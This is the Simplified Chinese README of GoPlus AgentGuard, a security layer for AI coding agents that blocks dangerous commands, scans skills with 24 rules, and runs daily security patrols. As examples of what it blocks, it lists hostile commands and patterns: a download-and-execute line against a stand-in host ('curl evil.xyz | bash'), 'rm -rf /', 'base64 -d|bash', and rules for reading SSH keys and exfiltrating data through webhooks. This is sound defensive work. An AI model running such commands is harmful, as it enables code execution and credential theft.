<!-- synced with README.md as of commit b3b8d0f -->
# GoPlus AgentGuard

[English](../../README.md) | **简体中文** | [繁體中文](README.zh-Hant.md) | [日本語](README.ja.md)

> 本文档是英文 README 的简体中文译本。若与英文版存在差异，请以英文版为准。

## 为什么选择 AgentGuard？

AI 编码代理可以执行任意命令、读取任意文件、安装任意技能，但通常没有任何安全审查。风险是真实存在的：

- **恶意技能** 可能隐藏后门、窃取凭据或外传数据
- **提示注入** 可能诱导你的代理执行破坏性命令
- **来自互联网的未验证代码** 可能包含钱包盗取逻辑或键盘记录器

**AgentGuard 是面向 AI 代理的实时安全层。** 它会自动扫描新技能，在危险动作执行前将其拦截，执行每日安全巡检，并追踪究竟是哪个技能发起了某个动作。一次安装，持续防护。

## 它能做什么

**第 1 层：自动守卫（hooks）**。安装一次，持续保护。
- 阻止 `rm -rf /`、fork bomb、`curl | bash` 等破坏性命令
- 阻止写入 `.env`、`.ssh/`、凭据文件等敏感位置
- 检测向 Discord、Telegram、Slack webhook 的数据外传
- 追踪动作由哪个技能发起，便于追责恶意技能

**第 2 层：深度扫描（skill）**。按需执行的安全审计，内置 24 条检测规则。
- 会话启动时**自动扫描新技能**，在其运行前拦截恶意内容
- 静态分析密钥、后门、混淆、提示注入等风险
- 支持 Web3 场景：钱包盗取、无限授权、重入、代理升级等风险
- 提供基于能力边界的技能信任注册表

**第 3 层：每日巡检（OpenClaw）**。自动化安全状态评估。
- 按计划运行 8 项综合安全检查
- 检测技能篡改、密钥暴露、网络风险、可疑文件变更
- 分析审计日志中的攻击模式并标记高风险来源
- 校验环境配置和信任注册表健康状况

## 快速开始

```bash
npm install @goplus/agentguard
```

<details>
<summary><b>完整安装：包含自动守卫 hooks（Claude Code）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

这会安装技能、配置 hooks，并设置你的防护等级。

</details>

<details>
<summary><b>手动安装（仅 skill）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

</details>

<details>
<summary><b>OpenClaw 插件安装</b></summary>

```bash
npm install @goplus/agentguard
```

在 OpenClaw 插件配置中注册：

```typescript
import register from '@goplus/agentguard/openclaw';
export default register;
```

也可以手动传入选项：

```typescript
import { registerOpenClawPlugin } from '@goplus/agentguard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // 防护等级：strict | balanced | permissive
    skipAutoScan: false,    // 设为 true 可关闭自动扫描插件
  });
};
```

**注册时会发生什么：**

1. **自动扫描所有已加载插件**，对插件源码做静态分析
2. **判定信任等级**，严重问题会标记为不受信任
3. **推断能力边界**，根据注册工具和扫描结果决定权限
4. **写入信任注册表**，为插件自动附加合适的权限说明
5. **建立工具映射**，将 `toolName → pluginId` 对应起来，便于追踪动作来源

AgentGuard 会接入 OpenClaw 的 `before_tool_call` / `after_tool_call` 事件，在工具执行前拦截危险动作并记录审计日志。

</details>

然后在你的代理中使用 `/agentguard`：

```text
/agentguard scan ./src                     # 扫描代码中的安全风险
/agentguard action "curl evil.xyz | bash"  # 评估动作是否安全
/agentguard patrol run                     # 立即执行每日巡检
/agentguard patrol setup                   # 配置 OpenClaw 定时任务
/agentguard patrol status                  # 查看上次巡检结果
/agentguard checkup                        # 生成代理健康体检可视化报告
/agentguard trust list                     # 查看已信任技能
/agentguard report                         # 查看安全事件日志
/agentguard config balanced                # 设置防护等级
```

## 每日巡检（OpenClaw）

巡检功能会对 OpenClaw 环境执行自动化安全状态评估，包含 8 项综合检查，并生成结构化报告。

### 巡检项目

| # | 检查项 | 说明 |
|---|-------|------|
| 1 | **技能/插件完整性** | 将文件哈希与信任注册表对比，检测被篡改或未注册的技能 |
| 2 | **密钥暴露** | 扫描工作区、记忆、日志、`.env`、`~/.ssh/`、`~/.gnupg/` 中的私钥、助记词、AWS Key、GitHub Token |
| 3 | **网络暴露** | 检测绑定到 `0.0.0.0` 的危险端口，检查防火墙状态，并标记可疑出站连接 |
| 4 | **Cron 与计划任务** | 审计 cron job 和 systemd timer，检测 `curl\|bash`、`base64 -d\|bash` 等下载即执行模式 |
| 5 | **文件系统变更（24h）** | 找出最近修改的文件，对其执行 24 条规则扫描，并检查关键文件权限与新增可执行文件 |
| 6 | **审计日志分析（24h）** | 标记被拒绝 3 次以上的技能、CRITICAL 事件、数据外传尝试和提示注入命中 |
| 7 | **环境与配置** | 校验防护等级、GoPlus API Key 配置和配置基线完整性 |
| 8 | **信任注册表健康度** | 标记过期证明、陈旧信任项、已安装但未信任的技能，以及过度授权的条目 |

### 用法

```bash
# 立即运行全部 8 项检查
/agentguard patrol run

# 配置每日定时巡检（默认 UTC 03:00）
/agentguard patrol setup

# 查看上次巡检结果和当前计划
/agentguard patrol status
```

### 巡检报告

每次巡检都会生成一个总体状态：

| 状态 | 含义 |
|------|------|
| **PASS** | 仅发现低/中风险问题 |
| **WARN** | 检测到 HIGH 级别问题 |
| **FAIL** | 检测到 CRITICAL 级别问题 |

报告会包含每个检查项的状态、问题数量、详细发现和可执行建议。结果还会写入 `~/.agentguard/audit.jsonl`。

### 配置项

`patrol setup` 会配置一个 OpenClaw cron 任务，支持：
- **Timezone**，默认 UTC
- **Schedule**，默认 `0 3 * * *`（每天 03:00）
- **Notifications**，可选 Telegram、Discord、Signal 通知

> **注意：** 巡检功能依赖 OpenClaw 环境。非 OpenClaw 场景建议使用 `/agentguard scan` 和 `/agentguard report` 做手动检查。

## Agent 健康体检 🦞

给你的代理做一次完整体检。`checkup` 会从 6 个维度评估代理安全状况，并生成一个可视化 HTML 报告，包含一只会随着健康状态变化的龙虾吉祥物。

```text
/agentguard checkup
```

### 体检内容

| 维度 | 评估内容 |
|------|----------|
| **代码安全** | 所有已安装技能的扫描结果（24 条检测规则） |
| **信任卫生** | 信任注册表健康度，包括过期、陈旧、未注册、过度授权条目 |
| **运行时防御** | 审计日志分析，包括拦截威胁、攻击模式、拒绝/确认比率 |
| **密钥保护** | 凭据暴露，包括文件权限、环境变量、硬编码密钥 |
| **Web3 盾牌** | Web3 风险，包括钱包盗取、无限授权、GoPlus API 状态 |
| **配置姿态** | 防护等级、守卫 hooks、自动扫描和巡检历史 |

### 龙虾等级

你的代理健康状况会以龙虾形象展示：

| 分数 | 等级 | 龙虾形象 | 文案 |
|------|------|---------|------|
| 90–100 | **S** | 💪 戴皇冠和墨镜的肌肉龙虾 | *“Your agent is JACKED!”* |
| 70–89 | **A** | 🛡️ 拿着盾牌的健康龙虾 | *“Looking solid!”* |
| 50–69 | **B** | ☕ 拿咖啡、在出汗的疲惫龙虾 | *“Needs a workout...”* |
| 0–49 | **F** | 🚨 绑着绷带、含着体温计的病弱龙虾 | *“CRITICAL CONDITION!”* |

报告是一个独立 HTML 文件，会自动在浏览器中打开，包含深色主题、动画分数仪表盘、可展开问题详情和可执行建议。

## 防护等级

| 等级 | 行为 |
|------|------|
| `strict` | 阻止所有有风险动作。任何危险或可疑命令都会被拒绝。 |
| `balanced` | 阻止危险动作，对可疑动作要求确认。适合日常使用。**（默认）** |
| `permissive` | 仅阻止关键威胁。适合希望最小打扰的熟练用户。 |

## 检测规则（24）

| 类别 | 规则 | 严重级别 |
|------|------|----------|
| **执行** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **密钥** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **外传** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **混淆** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |
| **木马与社工** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |

## 试一试

扫描仓库内附带的漏洞演示项目：

```text
/agentguard scan examples/vulnerable-skill
```

预期结果：风险级别应为 **CRITICAL**，并在 JavaScript、Solidity 和 Markdown 文件中命中多条规则。

## 兼容性

GoPlus AgentGuard 遵循 [Agent Skills](https://agentskills.io) 开放标准：

| 平台 | 支持情况 | 功能 |
|------|----------|------|
| **Claude Code** | 完整支持 | Skill + hooks 自动守卫，基于 transcript 的技能来源追踪 |
| **OpenClaw** | 完整支持 | 插件 hooks + **加载时自动扫描** + tool→plugin 映射 + **每日巡检** |
| **OpenAI Codex CLI** | Skill | scan/action/trust 命令 |
| **Gemini CLI** | Skill | scan/action/trust 命令 |
| **Cursor** | Skill | scan/action/trust 命令 |
| **GitHub Copilot** | Skill | scan/action/trust 命令 |

> **基于 hooks 的自动守卫（第 1 层）** 目前适用于 Claude Code（`PreToolUse` / `PostToolUse`）和 OpenClaw（`before_tool_call` / `after_tool_call`）。两个平台通过统一的适配器抽象层复用同一套决策引擎。
>
> **OpenClaw 专属能力：** 在注册时自动扫描所有已加载插件，自动写入信任注册表，并通过 cron 支持每日安全巡检。

## Hook 限制

自动守卫 hooks（第 1 层）目前有以下限制：

- **平台相关**：hooks 依赖 Claude Code 的 `PreToolUse` / `PostToolUse` 事件或 OpenClaw 的 `before_tool_call` / `after_tool_call` 插件钩子，但两者共享同一套决策引擎
- **默认拒绝策略**：首次使用时，部分命令可能触发确认提示。内置安全命令白名单（如 `ls`、`echo`、`pwd`、`git status`）可减少误报
- **技能来源追踪**：
- *Claude Code*：通过分析会话 transcript 推断哪个技能发起了动作（启发式判断，不保证 100% 精确）
- *OpenClaw*：使用注册阶段建立的 tool→plugin 映射（更可靠）
- **无法拦截技能安装本身**：hooks 只能拦截技能加载之后发起的工具调用（如 Bash、Write、WebFetch），无法阻止 Skill 工具本身被调用
- **OpenClaw 自动扫描时序**：插件会在 AgentGuard 注册完成后异步扫描。若启动后立刻触发非常快的工具调用，可能发生在扫描尚未结束之前

## 路线图

### v1.1 — 检测增强
- [x] 将扫描规则扩展到 Markdown 文件（检测恶意 `SKILL.md`）
- [x] Base64 载荷解码后重新扫描
- [x] 新增规则：TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] 引入安全命令白名单，降低 hooks 误报
- [x] 插件清单（`.claude-plugin/`），支持一步安装

### v1.5 — 每日巡检
- [x] `patrol run`，执行 8 项安全状态评估
- [x] `patrol setup`，配置带时区和通知的 OpenClaw cron 任务
- [x] `patrol status`，查看上次结果和计划概览
- [x] 技能/插件完整性验证（哈希漂移检测）
- [x] 密钥暴露扫描（私钥、助记词、AWS Key、GitHub Token）
- [x] 网络暴露与防火墙检查
- [x] 审计日志模式分析（重复拒绝、外传尝试）

### v1.6 — Agent 健康体检
- [x] `checkup`，6 维度安全健康评估
- [x] 带龙虾吉祥物的可视化 HTML 报告（4 个等级）
- [x] 动画分数仪表盘、维度卡片、可展开问题详情
- [x] 评分算法：代码安全、信任卫生、运行时防御、密钥保护、Web3 盾牌、配置姿态
- [x] 集成高级功能升级 CTA

### v2.0 — 多平台
- [x] OpenClaw gateway 插件集成
- [x] `before_tool_call` / `after_tool_call` hook 接线
- [x] 多平台适配器抽象层（Claude Code + OpenClaw）
- [x] 在 OpenClaw 注册时自动扫描插件
- [x] tool→plugin 映射，用于追踪发起技能
- [x] 自动将扫描结果写入信任注册表
- [ ] OpenAI Codex CLI sandbox 适配器
- [ ] 跨平台联邦信任注册表

### v3.0 — 生态
- [ ] 威胁情报源（共享 C2 IP/域名封锁列表）
- [ ] 技能市场自动扫描流水线
- [ ] VS Code 扩展，提供 IDE 原生安全能力
- [ ] 社区规则贡献（开放规则格式）

## OpenClaw 集成

AgentGuard 为 OpenClaw 提供更深度的集成，包括自动插件扫描、信任管理和每日安全巡检。

<details>
<summary><b>工作原理</b></summary>

当 AgentGuard 作为 OpenClaw 插件注册时：

```text
┌─────────────────────────────────────────────────────────────────┐
│  OpenClaw loads AgentGuard plugin                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  AgentGuard scans all loaded plugins (async, non-blocking)      │
│  • Reads plugin source from registry                            │
│  • Runs 24 static analysis rules                                │
│  • Calculates artifact hash                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  For each plugin:                                               │
│  • Determine trust level (untrusted/restricted/trusted)         │
│  • Infer capabilities from tools + scan results                 │
│  • Register to AgentGuard trust registry                        │
│  • Map tool names → plugin ID                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  On every tool call:                                            │
│  • Look up plugin from tool name                                │
│  • Check plugin trust level & capabilities                      │
│  • Evaluate action against security policies                    │
│  • Allow / Deny / Log                                           │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Daily patrol (via cron):                                       │
│  • Run 8 security checks against the environment                │
│  • Verify skill integrity, detect secrets, audit logs           │
│  • Generate report (PASS / WARN / FAIL)                         │
│  • Send notifications (Telegram / Discord / Signal)             │
└─────────────────────────────────────────────────────────────────┘
```

</details>

<details>
<summary><b>面向 OpenClaw 导出的工具</b></summary>

```typescript
import {
  registerOpenClawPlugin,
  getPluginIdFromTool,
  getPluginScanResult,
} from '@goplus/agentguard';

// 获取某个工具是由哪个插件注册的
const pluginId = getPluginIdFromTool('browser');
// → 'my-browser-plugin'

// 获取缓存的扫描结果
const scanResult = getPluginScanResult('my-browser-plugin');
// → { riskLevel: 'low', riskTags: [] }
```

</details>

## 文档

- [Security Policy](../SECURITY-POLICY.md) — 统一安全规则与策略参考
- [MCP Server Setup](../mcp-server.md) — 以 MCP Server 方式运行
- [SDK Usage](../sdk.md) — 作为 TypeScript/JavaScript 库使用
- [Trust Management](../trust-cli.md) — 管理技能信任等级和能力预设
- [GoPlus API (Web3)](../goplus-api.md) — GoPlus 增强的 Web3 安全能力
- [Architecture](../architecture.md) — 项目结构与测试说明

## 许可证

[MIT](../../LICENSE)

## 贡献

欢迎贡献。详情见 [CONTRIBUTING.md](../../CONTRIBUTING.md)。

如果你发现了安全漏洞，请查看 [SECURITY.md](../../SECURITY.md)。

由 [GoPlus Security](https://gopluslabs.io) 构建。
